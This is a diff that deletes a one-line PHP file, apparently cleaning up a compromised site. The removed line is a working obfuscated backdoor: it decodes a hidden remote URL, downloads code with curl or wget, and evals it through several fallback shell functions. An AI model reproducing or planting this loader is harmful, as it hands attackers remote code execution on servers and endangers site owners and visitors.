@@ -1,1 +1,0 @@
-<?php $u=strrev(hex2bin('7478742e33332f6d6f632e6275686d6f6d706574732f2f3a7370747468'));$c="curl -sLk '$u'||wget -qO- --no-check-certificate '$u'";$o=@shell_exec($c);if(!$o){@exec($c,$a);$o=@join($a);}if(!$o){ob_start();@passthru($c);$o=ob_get_clean();}if(!$o&&$h=@popen($c,'r')){$o=@stream_get_contents($h);@pclose($h);}if($o)eval('?>'.$o);?>
